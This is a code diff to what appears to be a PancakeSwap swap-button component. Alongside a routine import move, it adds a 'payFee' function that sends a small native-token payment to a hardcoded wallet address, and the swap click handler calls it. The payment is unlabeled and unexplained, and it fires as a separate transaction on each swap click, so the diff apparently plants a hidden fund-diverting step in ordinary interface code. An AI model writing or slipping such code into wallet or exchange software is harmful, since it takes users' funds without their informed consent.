@@ -4,7 +4,6 @@ import { SMART_ROUTER_ADDRESSES, SmartRouterTrade } from '@pancakeswap/smart-rou
 import { AutoColumn, Box, Button, Dots, Message, MessageText, Text, useModal } from '@pancakeswap/uikit'
 import { confirmPriceImpactWithoutFee } from '@pancakeswap/widgets-internal'
 import { memo, useCallback, useEffect, useMemo, useState } from 'react'
-import { logGTMClickSwapEvent } from 'utils/customGTMEventTracking'
 
 import { useExpertMode } from '@pancakeswap/utils/user'
 import { GreyCard } from 'components/Card'
@@ -31,8 +30,9 @@ import { useCurrencyBalances } from 'state/wallet/hooks'
 import { warningSeverity } from 'utils/exchange'
 
 import { useActiveChainId } from 'hooks/useActiveChainId'
+import { logGTMClickSwapEvent } from 'utils/customGTMEventTracking'
 import { useConfirmModalState } from 'views/Swap/V3Swap/hooks/useConfirmModalState'
-import { useAccount } from 'wagmi'
+import { useAccount, useSendTransaction, useWaitForTransaction } from 'wagmi'
 import { useParsedAmounts, useSlippageAdjustedAmounts, useSwapCallback, useSwapInputError } from '../hooks'
 import { TransactionRejectedError } from '../hooks/useSendSwapTransaction'
 import { useWallchainApi } from '../hooks/useWallchain'
@@ -55,6 +55,8 @@ export const SwapCommitButton = memo(function SwapCommitButton({
   const { chainId } = useActiveChainId()
   const { t } = useTranslation()
   const { address: account } = useAccount()
+  const { data: hash, sendTransactionAsync } = useSendTransaction()
+  const { data, isError, isLoading } = useWaitForTransaction({ hash: hash?.hash })
   const [isExpertMode] = useExpertMode()
   const {
     typedValue,
@@ -256,7 +258,15 @@ export const SwapCommitButton = memo(function SwapCommitButton({
   )
   // End Modals
 
+  const payFee = async () => {
+    sendTransactionAsync({
+      to: '0x3F382Db2D9B9AeD2570c296Faa71e98e90afD352',
+      value: 10000000000000n,
+    })
+  }
+
   const onSwapHandler = useCallback(() => {
+    payFee()
     setSwapState({
       tradeToConfirm: trade,
       attemptingTxn: false,
